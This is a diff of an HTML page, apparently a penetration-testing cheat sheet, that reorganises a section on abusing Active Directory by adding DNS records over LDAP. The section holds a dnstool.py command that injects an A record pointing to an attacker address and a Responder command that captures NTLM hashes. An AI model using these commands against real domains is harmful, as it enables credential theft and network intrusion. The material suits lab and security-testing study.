@@ -199,13 +199,17 @@
 </ul>
 
 <div class="content"><hr>
-<h3 id="tools">Tools</h3>
-<p><a href="https://github.com/dirkjanm/krbrelayx">krbrelayx</a></p>
 <h3 id="abuse-1-add-active-directory-integrated-dns-records-via-ldap">Abuse #1: Add Active Directory Integrated DNS records via LDAP</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 dnstool.py -u &lt;DOMAIN&gt;<span class="se">\\</span>&lt;USER&gt; -p &lt;PASSWORD&gt; --action add --record <span class="nb">test</span> --data 10.10.14.10 --type A 10.10.11.10
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Capture NTLM hash</span>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Capture NTLM hash</span>
 </span></span><span class="line"><span class="cl">sudo responder -I tun0
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 dnstool.py -u &lt;DOMAIN&gt;<span class="se">\\</span>&lt;USER&gt; -p &lt;PASSWORD&gt; --action add --record <span class="nb">test</span> --data 10.10.14.10 --type A 10.10.11.10
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/dirkjanm/krbrelayx">krbrelayx tools</a></em></small></p></div></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
